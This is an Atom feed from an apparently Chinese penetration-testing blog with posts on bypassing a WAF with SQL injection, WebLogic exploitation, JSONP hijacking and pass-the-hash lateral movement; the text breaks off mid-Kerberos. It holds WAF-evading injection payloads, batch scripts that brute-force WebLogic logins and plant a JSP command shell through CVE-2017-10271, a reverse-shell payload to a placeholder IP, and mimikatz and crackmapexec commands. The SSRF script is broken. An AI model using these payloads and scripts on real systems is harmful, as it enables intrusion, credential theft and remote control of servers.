<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>phyb0x&#39;Blog</title>
  
  <subtitle>智能安全初学者</subtitle>
  <link href="https://phyb0x.github.io/atom.xml" rel="self"/>
  
  <link href="https://phyb0x.github.io/"/>
  <updated>2019-01-20T13:45:44.000Z</updated>
  <id>https://phyb0x.github.io/</id>
  
  <author>
    <name>Yumi</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sql绕安全狗</title>
    <link href="https://phyb0x.github.io/2019/01/20/%E8%BF%87Waf/"/>
    <id>https://phyb0x.github.io/2019/01/20/%E8%BF%87Waf/</id>
    <published>2019-01-20T13:42:14.000Z</published>
    <updated>2019-01-20T13:45:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>近几天出了很多过狗文章，也看了tools一些前辈的思路，记录下过狗的sql语句、过程。</p><span id="more"></span><p>版本</p><p><img src="https://i.imgur.com/eYqDgfm.png"></p><h3 id="注入过安全过4-0payload"><a href="#注入过安全过4-0payload" class="headerlink" title="注入过安全过4.0payload"></a>注入过安全过4.0payload</h3><h3 id="fuzz特殊字符"><a href="#fuzz特殊字符" class="headerlink" title="fuzz特殊字符"></a>fuzz特殊字符</h3><pre><code>fuzz_zs =  [&#39;/*&#39;,&#39;*/&#39;,&#39;/*!&#39;,&#39;*&#39;,&#39;=&#39;,&#39;`&#39;,&#39;!&#39;,&#39;@&#39;,&#39;%&#39;,&#39;.&#39;,&#39;-&#39;,&#39;+&#39;,&#39;|&#39;,&#39;%00&#39;]fuzz_ch = [&quot;%0a&quot;,&quot;%0b&quot;,&quot;%0c&quot;,&quot;%0d&quot;,&quot;%0e&quot;,&quot;%0f&quot;,&quot;%0g&quot;,&quot;%0h&quot;,&quot;%0i&quot;,&quot;%0j&quot;]</code></pre><h4 id="and判断注入点"><a href="#and判断注入点" class="headerlink" title="and判断注入点"></a>and判断注入点</h4><p>本来想直接fuzz，但是发现没跑出来，还是要找好fuzz点，再加上一定规则fuzz出的payload也许后面的语句同样适用。</p><pre><code>?id=1&#39; and /*!1=1*/ %23</code></pre><p><img src="https://i.imgur.com/GWzguhW.png"></p><p><img src="https://i.imgur.com/jBre7nc.png"></p><h4 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h4><p>上面fuzz出的语句依旧有效</p><pre><code>?id=1&#39; order/*!%0a/*!by*/ 3%23</code></pre><p><img src="https://i.imgur.com/BBJI5gm.png"></p><h4 id="union-select"><a href="#union-select" class="headerlink" title="union select"></a>union select</h4><p>还是先测试了上面的语句，发现不行<br><a href="https://www.t00ls.net/viewthread.php?tid=46726&highlight=%E5%AE%89%E5%85%A8%E7%8B%97">https://www.t00ls.net/viewthread.php?tid=46726&amp;highlight=%E5%AE%89%E5%85%A8%E7%8B%97</a></p><p>文章指出根据/<em>！5001uninon</em>/衍生出/<em>!90000aaa</em>/可以绕过 union select，测试成功，数值大于一定范围就行。</p><pre><code>id=1&#39; union/*!5555555xxx*/select/*!555555xxx*/%201,2,3%23</code></pre><p>但是指定mysql user()/database()等函数时会拦截 </p><p>可用/**/绕过</p><pre><code>id=1&#39; union/*!5555555xxx*/select/*!555555xxx*/%201,2,database/**/()%23        数据库名: lalala</code></pre><p><img src="https://i.imgur.com/YEBreYc.png"></p><h5 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h5><pre><code>?id=1&#39; union/*!5555555xxx*/select/*!555555xxx*/%20 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;lalala&#39;%23</code></pre><p><img src="https://i.imgur.com/Di84kFT.png"></p><h5 id="查询字段"><a href="#查询字段" class="headerlink" title="查询字段"></a>查询字段</h5><pre><code>http://192.168.233.133/test/test.php?id=1&#39; union/*!5555555xxx*/select/*!555555xxx*/%20 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;%23</code></pre><p><img src="https://i.imgur.com/WEbcvUO.png"></p><h5 id="爆值"><a href="#爆值" class="headerlink" title="爆值"></a>爆值</h5><pre><code>http://192.168.233.133/test/test.php?id=1 &#39;union/*!555555xxx*/select /*!555555xxx*/1,user,password/*!55555xxx*//*!555555xxx*/from users%23</code></pre><p><img src="https://i.imgur.com/fl2JeJO.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>还是要有猥琐骚思路，多结合前辈们的姿势加以延伸结合fuzz绕过。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;近几天出了很多过狗文章，也看了tools一些前辈的思路，记录下过狗的sql语句、过程。&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://phyb0x.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>weblogic漏洞利用汇总</title>
    <link href="https://phyb0x.github.io/2019/01/17/weblogic%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B1%87%E6%80%BB/"/>
    <id>https://phyb0x.github.io/2019/01/17/weblogic%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B1%87%E6%80%BB/</id>
    <published>2019-01-17T00:11:05.000Z</published>
    <updated>2019-01-19T02:05:32.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="漏洞列表"><a href="#漏洞列表" class="headerlink" title="漏洞列表"></a>漏洞列表</h3><pre><code>弱口令ssrf CVE-2014-4210WLS 组件远程代码执行 CVE-2017-10271任意上传 CVE-2018-2894</code></pre><span id="more"></span><p>vulhub地址：<a href="https://github.com/vulhub/vulhub/tree/master/weblogic">https://github.com/vulhub/vulhub/tree/master/weblogic</a></p><h3 id="weak-passwd-amp-amp-CVE-2018-2894"><a href="#weak-passwd-amp-amp-CVE-2018-2894" class="headerlink" title="weak passwd&amp;&amp;CVE-2018-2894"></a>weak passwd&amp;&amp;CVE-2018-2894</h3><p>weblogic 10.3.6(11g)</p><p>登录地址:</p><pre><code>http://ip:7001/console/login/LoginForm.jsp</code></pre><p>默认口令:</p><pre><code>weblogicOracle@123</code></pre><p>CVE-2018-2894要登录上传详情</p><p><a href="https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2894" title="CVE-2018-2894">https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2894</a></p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>这里只对弱口令进行进行判断，上传getshell详细可看 <a href="https://github.com/vulhub/vulhub/tree/master/weblogic/weak_password">https://github.com/vulhub/vulhub/tree/master/weblogic/weak_password</a></p><pre><code>import requestsdef weak_passwd():    users = [&#39;weblogic&#39;,&#39;admin&#39;,&#39;system&#39;,&#39;mary&#39;,&#39;wlcsystem&#39;,&#39;wlpisystem&#39;]    passwds = [&#39;password&#39;,&#39;Oracle@123&#39;,&#39;weblogic&#39;,&#39;security&#39;,&#39;wlcsystem&#39;,&#39;wlpisystem&#39;]    with open(r&#39;ip.txt&#39;,&#39;r&#39;) as f:        for ip in f.readlines():            ip = ip.strip()            try:                target = &#39;http://&#39; + ip + &#39;/console/j_security_check&#39;                headers = &#123;                &#39;Host&#39;: ip,                &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&#39;,                &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,                &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#39;,                &#125;                for user in users:                    for passwd in passwds:                        data = &#123;&#39;j_username&#39;:user,&#39;j_password&#39;:passwd&#125;                        r = requests.post(url=target,data=data,headers=headers,timeout=5)                        if r.text.count(&#39;注销&#39;) != 0:                            print(&#39;[+]&#39; + ip + &#39;    登录成功&#39; + &#39;user:&#123;&#125;  passwd:&#123;&#125;&#39;.format(user,passwd))            except Exception as e:                print(&#39;[+]&#39; + ip + &#39;    失败&#39;)if __name__ == &#39;__main__&#39;:    weak_passwd()</code></pre><h3 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h3><p>Oracle WebLogic Server10.3.6.0.0 版本</p><p>Oracle WebLogic Server12.1.3.0.0 版本</p><p>Oracle WebLogic Server12.2.1.1.0 版本</p><p>Oracle WebLogic Server12.2.1.2.0 版本</p><p>这个漏洞成因是通过XMLDecoder来进行反序列化操作。<a href="blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html" title="XMLDecoder的反序化问题">blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html</a></p><p>反弹shell</p><p><img src="https://i.imgur.com/5KhElTP.png"></p><p>传cmdshell</p><p><img src="https://i.imgur.com/886SOAD.png"></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><pre><code>import requestsdef wls_unser():    with open(r&#39;ip.txt&#39;,&#39;r&#39;) as f:        for ip in f.readlines():            ip = ip.strip()            try:                url = &#39;http://&#39; + ip + &#39;/wls-wsat/CoordinatorPortType&#39;                target = &#39;http://&#39; + ip + &#39;/bea_wls_internal/index.jsp&#39;                headers = &#123;                &#39;Content-Type&#39;: &#39;text/xml&#39;,                &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&#39;,                &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,                &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#39;,                &#125;                data = &#39;&#39;&#39;&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;                            &lt;soapenv:Header&gt;                            &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;                            &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;                            &lt;object class=&quot;java.io.PrintWriter&quot;&gt;                             &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/index.jsp&lt;/string&gt;                            &lt;void method=&quot;println&quot;&gt;&lt;string&gt;                            &lt;![CDATA[&lt;%   if(&quot;wahaha&quot;.equals(request.getParameter(&quot;password&quot;)))&#123;                              java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;command&quot;)).getInputStream();                              int a = -1;                              byte[] b = new byte[2048];                              out.print(&quot;&lt;pre&gt;&quot;);                              while((a=in.read(b))!=-1)&#123;                                  out.println(new String(b));                              &#125;                              out.print(&quot;&lt;/pre&gt;&quot;);                              &#125; %&gt;]]&gt;                            &lt;/string&gt;                            &lt;/void&gt;                            &lt;void method=&quot;close&quot;/&gt;                            &lt;/object&gt;&lt;/java&gt;&lt;/java&gt;                            &lt;/work:WorkContext&gt;                            &lt;/soapenv:Header&gt;                            &lt;soapenv:Body/&gt;                        &lt;/soapenv:Envelope&gt;&#39;&#39;&#39;                &#39;&#39;&#39;                反弹shell请替换data以及接收端ip&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;2&quot;&gt;&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/xxx.xxx.xxx.xxx/21 0&amp;gt;&amp;amp;1&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;                &#39;&#39;&#39;                r = requests.post(url=url,data=data,headers=headers,timeout=4)                res = requests.get(url=target,headers=headers,timeout=4)                if res.status_code == 200 :                    print(&#39;[+] shell:&#39; + target)            except Exception as e:                    print(&#39;[+]&#39;+ ip + &#39;    失败&#39;)if __name__ == &#39;__main__&#39;:    wls_unser()</code></pre><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>docker搭建环境失败了，不知道什么原因。</p><p>ssrf利用</p><p><a href="http://docs.ioin.in/writeup/fuzz.wuyun.org/_src_build_your_ssrf_exp_autowork_pdf/index.pdf">http://docs.ioin.in/writeup/fuzz.wuyun.org/_src_build_your_ssrf_exp_autowork_pdf/index.pdf</a></p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>环境没搭建成，没测试</p><pre><code>import requestsdef ssrf(ip):    try:        #payload =input(&#39;payload:&#39;)        target = &#39;http://&#39; + ip + &#39;/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=&#123;&#125;&#39;.format(payload)        if payload == &#39;&#39;:            target = &#39;http://&#39; + ip + &#39;/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001&#39;            headers = &#123;            &#39;Content-Type&#39;: &#39;text/xml&#39;,            &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&#39;,            &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,            &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#39;,            &#125;            res = requests.get(url=target,headers=headers,timeout=4)            if res.status_code == 200 and &#39;Oracle WebLogic Server&#39; in res.text:                print(&#39;[+]&#39; + ip + &#39;    存在ssrf&#39;)        else:            print(res.text)     except Exception as e:        print(&#39;[+]&#39; + ip + &#39;    失败&#39;)if __name__ == &#39;__main__&#39;:    with open(r&#39;ip.txt&#39;,&#39;r&#39;) as f:        for ip in f.readlines():            ip = ip.strip()                wls_unser(ip)            weak_passwd(ip)            ssrf(ip)</code></pre><p>简单合一块也没加多线程效率低下。</p><p><img src="https://i.imgur.com/iQ7bsbb.png"></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;漏洞列表&quot;&gt;&lt;a href=&quot;#漏洞列表&quot; class=&quot;headerlink&quot; title=&quot;漏洞列表&quot;&gt;&lt;/a&gt;漏洞列表&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;弱口令
ssrf CVE-2014-4210
WLS 组件远程代码执行 CVE-2017-10271
任意上传 CVE-2018-2894
&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://phyb0x.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>jsonp安全</title>
    <link href="https://phyb0x.github.io/2019/01/14/jsonp%E5%AE%89%E5%85%A8/"/>
    <id>https://phyb0x.github.io/2019/01/14/jsonp%E5%AE%89%E5%85%A8/</id>
    <published>2019-01-14T09:12:00.000Z</published>
    <updated>2019-01-19T02:06:02.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>JSON with Paddig，JSONP基本语法如下：</p><pre><code>callback(&#123; &quot;name&quot;: &quot;kwan&quot; , &quot;msg&quot;: &quot;获取成功&quot; &#125;);</code></pre><p>JSONP是基于JSON格式为解觉跨域问题而产生的解觉方案。</p><span id="more"></span><h3 id="jsonp-跨域"><a href="#jsonp-跨域" class="headerlink" title="jsonp 跨域"></a>jsonp 跨域</h3><p>说起来也很难简单a.com b.com 假设a.com要访问b.com的json数据</p><pre><code>&#123;&quot;id&quot; : &quot;1&quot;,&quot;name&quot; : &quot;phyb0x&quot;&#125;</code></pre><p>b.com上要有一个callback输出点</p><pre><code>&lt;?php//getUsers.php$callback = $_GET[&#39;callback&#39;];print $callback.&#39;(&#123;&quot;id&quot; : &quot;1&quot;,&quot;name&quot; : &quot;phyb0x&quot;&#125;);&#39;;?&gt;</code></pre><p>然后a.com进行调用</p><pre><code>&lt;script type=&quot;text/javascript&quot; src=&quot;http://mini.jiasule.com/framework/jquery/1.9.1/jquery-1.9.1.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;$.getJSON(&quot;http://www.b.com/getUsers.php?callback=?&quot;, function(getUsers)&#123;  alert(getUsers.name);&#125;);&lt;/script&gt;</code></pre><p>会根据callback定义的函数功能返回json数据。</p><p>说起来真的晦涩难懂，实际上这个流程就是b.com上本身就有一个jsonp格式传输的点，a.com利用callback传参的函数(可以是内置写好的函数也可以是a.com自定义的(用?表示，同上述例子))去返回相应的数据。</p><p>一开始我以为跨域是漏洞的点，但是看了乌云案例发现跨域是jsonp的基本功能，漏洞点在于jsonp传输了一些敏感数据，而我们可以通过csrf+jsonp跨域获到这些敏感数据。</p><h3 id="JSONP安全问题"><a href="#JSONP安全问题" class="headerlink" title="JSONP安全问题"></a>JSONP安全问题</h3><h4 id="json劫持"><a href="#json劫持" class="headerlink" title="json劫持"></a>json劫持</h4><p>当某网站使用JSONP传递敏感数据的时候，攻击者可以构造恶意JSONP调用界面，诱导被攻击者访问。</p><p>引用wooyun-2013-019969</p><pre><code>http://tinfo.qunar.com/ticket/passenger/passenger_info.jsp?&amp;type=passenger&amp;callback=qunarcallback</code></pre><p>构造构造poc跨域获取敏感信息</p><pre><code>&lt;script&gt;function qunarcallback(json)&#123;    alert(JSON.stringify(json))&#125;&lt;/script&gt;&lt;script src=&quot;http://tinfo.qunar.com/ticket/passenger/passenger_info.jsp?&amp;type=passenger&amp;callback=qunarcallback&quot;&gt;&lt;/script&gt;</code></pre><p><img src="https://i.imgur.com/Lp5eodh.jpg"></p><p>有时也会对referer进行限制，可以尝试</p><pre><code>http://www.qq.com.attack.com/attack.htm http://www.attack.com/attack.htm?qq.com</code></pre><p>或者利用<code>&lt;iframe&gt;</code> 调用 javscript 伪协议来实现空 Referer 调用 JSON 文件</p><pre><code>&lt;iframe src=&quot;javascript:&#39;&lt;script&gt;function JSON(o)&#123;alert(o.userinfo.userid);&#125;&lt;/script&gt;&lt;script src=http://www.qq.com/login.php?calback=JSON&gt;&lt;/script&gt;&#39;&quot;&gt;&lt;/iframe&gt;</code></pre><p>还有一种是增加token防御，不过也可以尝试暴力破解</p><pre><code>function _Callback(o)&#123;alert(o.items[0].uin);&#125;for(i=17008;i&lt;17009;i++)&#123;  //暴力循环调用getJSON(&quot;http://r.qzone.qq.com/cgi-bin/tfriend/friend_show_qqfriends.cgi?uin=1111111&amp;g_tk=&quot;+i);&#125;</code></pre><h4 id="Callback函数可定义"><a href="#Callback函数可定义" class="headerlink" title="Callback函数可定义"></a>Callback函数可定义</h4><pre><code>&lt;?php//getUsers.php$callback = $_GET[&#39;callback&#39;];print $callback.&#39;(&#123;&quot;id&quot; : &quot;1&quot;,&quot;name&quot; : &quot;phyb0x&quot;&#125;);&#39;;?&gt;</code></pre><p>$callback没有进行任何过滤</p><h5 id="Content-Type与XSS"><a href="#Content-Type与XSS" class="headerlink" title="Content-Type与XSS"></a>Content-Type与XSS</h5><p>Content-Type: application/json 传入</p><pre><code>http://127.0.0.1/getUsers.php?callback=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></pre><p>构成xss，而application / javascript  而这个头在 IE 等浏览器下一样可以解析 HTML 导致 XSS 漏洞。</p><p>防御绕过姿势</p><p>严格定义 Content-Type: application / json，这种方式会不解析恶意插入的 XSS 代码（直接访问提示文件下载），在 IE6、7 等版本时请求的 URL 文件后面加一个 /x.html 就可以解析 html。</p><p>过滤 callback 以及 JSON 数据输出，常规防御手段，也粗在绕过可能。</p><p>参考链接: </p><p><a href="http://blog.knownsec.com/2015/03/jsonp_security_technic/">http://blog.knownsec.com/2015/03/jsonp_security_technic/</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;JSONP&quot;&gt;&lt;a href=&quot;#JSONP&quot; class=&quot;headerlink&quot; title=&quot;JSONP&quot;&gt;&lt;/a&gt;JSONP&lt;/h3&gt;&lt;p&gt;JSON with Paddig，JSONP基本语法如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;callback(&amp;#123; &amp;quot;name&amp;quot;: &amp;quot;kwan&amp;quot; , &amp;quot;msg&amp;quot;: &amp;quot;获取成功&amp;quot; &amp;#125;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;JSONP是基于JSON格式为解觉跨域问题而产生的解觉方案。&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://phyb0x.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>横向移动</title>
    <link href="https://phyb0x.github.io/2018/12/29/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>https://phyb0x.github.io/2018/12/29/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2018-12-29T10:19:47.000Z</published>
    <updated>2019-01-19T02:03:38.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>想想横向移动自己也就只懂msf、IPC啥的打一打，有点菜，总结学习一些横向移动的姿势。</p><span id="more"></span><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h3 id="加密与hash的区别"><a href="#加密与hash的区别" class="headerlink" title="加密与hash的区别"></a>加密与hash的区别</h3><p>哈希（Hash）</p><p>是将目标文本转换成具有相同长度的、不可逆的杂凑字符串（或叫做消息摘要）</p><p>加密（Encrypt）</p><p>是将目标文本转换成具有不同长度的、可逆的密文。</p><p>主要的区别有如下两点</p><p>1、哈希算法往往被设计成生成具有相同长度的文本，而加密算法生成的文本长度与明文本身的长度有关。</p><p>2、哈希算法是不可逆的，而加密算法是可逆的。</p><h3 id="hash类型"><a href="#hash类型" class="headerlink" title="hash类型"></a>hash类型</h3><h4 id="LM-HASH"><a href="#LM-HASH" class="headerlink" title="LM HASH"></a>LM HASH</h4><p>LAN Manager（LM）哈希是Windows系统所用的第一种密码哈希算法。在LAN Manager协议中使用，非常容易通过暴力破解获取明文凭据。但是在Windows Vista和Windows 7系统之后，这种哈希算法是默认关闭。</p><p>hash生成方法</p><pre><code>用户的密码字符串被全部转换成大写字母形式；给密码字符串增加空字符，直到使其包含有14个字符为止；“新”得到的密码字符串被分成两半，每一半分别包含7个字符；每一半字符串都各自添加一个校验位，分别用于创建两个64位的DES加密密钥；所生成的每一个DES密钥都被用于加密一个固定的ASCII字符串KGS!@#$%，得到两个长度为8字节的密文；两个8字节的密文合并起来，形成1个16字节的字符串。至此，LM哈希结束。</code></pre><h4 id="NTML"><a href="#NTML" class="headerlink" title="NTML"></a>NTML</h4><p>NTML 是用于 Windows NT 和 Windows 2000 Server 工作组环境的身份验证协议。它还用在必须对 Windows NT 系统进行身份验证的混合 Windows 2000 Active Directory 域环境中。这类Hash可以直接用于PtH，并且通常存在于lsass进程中，便于SSP使用。</p><p>hash生成方法</p><pre><code>将明文口令转换成十六进制的格式转换成Unicode格式，即在每个字节之后添加0x00对Unicode字符串作MD4加密，生成32位的十六进制数字串</code></pre><p>Windows系统下hash密码格式 用户名称:RID:LM-HASH值:NT-HASH值，</p><p>可以用LM-HASH值:NT-HASH值去在线查询<a href="http://www.objectif-securite.ch/en/ophcrack.php">http://www.objectif-securite.ch/en/ophcrack.php</a>或者使用GetHashes、Ophcrack破解系统Hash密码。</p><h4 id="NET-NTLM-HASH"><a href="#NET-NTLM-HASH" class="headerlink" title="NET-NTLM HASH"></a>NET-NTLM HASH</h4><p>NTML认证流程如下：</p><pre><code>1、客户端向服务器发送一个请求，请求中包含明文的登录用户名。服务器会提前存储登录用户名和对应的密码hash2、服务器接收到请求后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回客户端。使用存储的登录用户密码hash加密Challenge，获得Challenge13、客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，获得Challenge2(这个结果被称为response)，将response发送给服务器4、服务器接收客户端加密后的response，比较Challenge1和response，如果相同，验证成功</code></pre><p>域环境的话其实是一样的，就是发送随机数比对challenge和response都是在DC中进行，server就只当中间商了，client把challenge,response及username传给server，server再传给DC进行比对。</p><p><img src="https://i.imgur.com/rGdeZUA.png"></p><p>NET-NTLM HASH是指网络环境下NTLM认证中的hash，有两种一种是Net-NTLMv1另一种是Net-NTLMv2。</p><p>Net-NTLMv1 相对脆弱，自Windows Vista/Server2008开始，系统默认禁用Net-NTLMv1，使用Net-NTLMv2。</p><h3 id="哈希传递-pth"><a href="#哈希传递-pth" class="headerlink" title="哈希传递(pth)"></a>哈希传递(pth)</h3><p>pth就是直接通过LM HASH和NTLM HASH不需要明文密码直接远程登录。上述说的Net-NTML是不能用于pth的。</p><p>适用于</p><pre><code>域/工作组环境可以获得hash,但是条件不允许对hash爆破内网中存在和当前机器相同的密码</code></pre><h4 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h4><pre><code>use exploit/windows/smb/psexec_pshset smbdomain xx.intSet SMBuser adminset SMBPass 01FC5A6BE7BC6929AAD3BXXX:0CB6948805F7XXXXX807973B89537</code></pre><p>看大佬的讨论说psexec_psh网络可达 普通用户权限能直接用，但是在2008系统hash的情况下用，抓到2003的hash没法用这个来连接smb。</p><h4 id="pth-exec"><a href="#pth-exec" class="headerlink" title="pth-exec"></a>pth-exec</h4><p>kali自带的pth的工具很多</p><p><img src="https://i.imgur.com/Q9A56kX.png"></p><pre><code>pth-winexec -U pentestlab/administrator%eb9e3066e4d25b5025ad3b83fa6627c7:03bebb338e70244589ea67c7439c77ba //1.1.1.21 cmd.exe</code></pre><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>先抓密码取得NTMLhash，mimikatz实现了在禁用NTLM的环境下仍然可以远程连接。</p><pre><code>privilege::debugsekurlsa::logonpasswordsmimikatz # sekurlsa::pth /user:Administrator /domain:FENTESTLAB.com /ntlm:11ec7935618f326490509a0703fbadb8</code></pre><p><img src="https://i.imgur.com/PrMNH5k.png"></p><p>还可以利用aes key远程连接(要安装kb2871997这个补丁才可以测试成功，这里只做记录)</p><p>获取aes key</p><pre><code>privilege::debugsekurlsa::ekeys</code></pre><p><img src="https://i.imgur.com/b8haBxo.png"></p><pre><code>privilege::debug sekurlsa::pth /user:Administrator /domain:FENTESTLAB.com /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c</code></pre><p>弹出cmd之后连接的时候要使用计算机名称，如果不更换密码aes key可以一直使用。</p><pre><code>dir \\WIN-8VVLRPIAJB0\c$</code></pre><h4 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h4><p>wmi是从windows从03/xp开始win内置的插件，是为了管理员能更加方便的对远程windows主机进行各种日常管理。</p><p>win版：<a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p><p>python版：<a href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py">https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py</a></p><pre><code>wmiexec -hashes 00000000000000000000000000000000:7ECFFFF0C3548187607A14BAD0F88BB1 域名/用户名@192.168.1.1 &quot;whoami&quot;</code></pre><h4 id="Invoke-TheHash"><a href="#Invoke-TheHash" class="headerlink" title="Invoke-TheHash"></a>Invoke-TheHash</h4><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash">https://github.com/Kevin-Robertson/Invoke-TheHash</a>    </p><pre><code>Invoke-WMIExec -Target 1.1.1.22 -Domain pentestlab -Username administrator -Hash 7ECFFFF0C3548187607A14BAD0F88BB1 -Command &quot;command or launcher to execute&quot; -verbose</code></pre><p><img src="https://i.imgur.com/Uv0YQfe.png"></p><p>没有执行成功，里面有很多脚本应用场景也不同。</p><h4 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h4><p>这个工具可以对C段进行批量尝试pth，可以先ew代理到kali</p><p><a href="https://github.com/byt3bl33d3r/CrackMapExec.git">https://github.com/byt3bl33d3r/CrackMapExec.git</a></p><pre><code>crackmapexec 1.1.1.0/24 -u administrator -H 11ec7935618f326490509a0703fbzdb8</code></pre><h3 id="kerberos"><a href="#kerberos" class="headerlink" title="kerberos"></a>kerberos</h3><p><img src="https://i.imgur.com/DhO9w4v.png"></p><pre><code>第一:从AS服务器中获取TGT票据用户在客户端输入账号和密码之后，会对密码进行hash处理，作为user-secret-key1. 客户端将用户名发送给AS服务器申请服务,在AS服务器中会对用户名进行验证，在AS服务器本地数据库中查询到该用户名的密码，并使用hash生成user-secrect-key.2. AS服务器向用户发送两样东西：   1） Client/TGS会话密钥，使用user-secrect-key进行加密   2） TGT，包含TGS会话密钥，用户信息，时间戳，TGT有效期。使用TGS密钥进行加密3. 